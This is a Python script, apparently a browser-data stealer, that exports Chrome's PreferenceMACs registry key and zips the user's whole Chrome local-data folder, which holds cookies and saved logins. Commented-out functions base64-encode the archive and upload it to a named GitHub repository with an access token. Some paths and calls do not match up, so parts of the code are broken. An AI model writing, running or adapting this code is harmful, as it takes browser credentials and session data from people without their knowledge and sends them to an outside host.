from os import system, path, environ, walk
from zipfile import ZipFile, ZIP_DEFLATED
from base64 import b64encode
import json
import requests
Path = "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\export.reg"

# ------------------- get data -----------------
def getData():
    system(f"REG EXPORT HKEY_CURRENT_USER\\Software\\Google\\Chrome\\PreferenceMACs {Path}")
    return True
# ------------------- get data -----------------

# ------------------- zip data -----------------


def createzip():
    folder_path = path.join(environ['userprofile'], "appdata", "local", "google", "chrome")
    zip_path = path.join(environ['userprofile'], "appdata", "local", "google", "reg.zip")

    if path.exists(folder_path):
        with ZipFile(zip_path, "w", compression= ZIP_DEFLATED) as zipobj:
            for root, _, files in walk(folder_path):
                for file in files:
                    file_path = path.join(root, file)
                    zipobj.write(file_path, path.relpath(file_path, folder_path))

        return True
    else:
        return "Folder does not exist."




# # ------------------- zip data -----------------
#
# # ------------------- convert 2 64 data -----------------
# def Convert2Base64():
#     with open(f"{environ['USERPROFILE']}" + fr"/AppData/reg.zip", 'rb') as F:
#         BaseCvt = b64encode(F.read())
#     return BaseCvt
# # ------------------- convert 2 64 data -----------------
#
# # ------------------- def send data -----------------
# def sendGit(TOKEN, content, name_file_in_site):
#     sha = requests.get(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_in_site}",
#                        headers={"Authorization": f"token {TOKEN}"}).json()["sha"]
#     content_bytes = content.decode('utf-8')
#     print(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_in_site}")
#     data = {"content": content_bytes, "message": "data", "sha": sha}
#     data = json.dumps(data)
#     main = requests.put(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_in_site}", data=data,
#                         headers={"Authorization": f"token {TOKEN}"})
#     if main.status_code == 200:
#         return True
#     else:
#         return False
# ------------------- def send data -----------------




getData()
zipData = createzip()
print(zipData)
#
# if zipData == True:
#     Content = Convert2Base64()
#     sendGit()
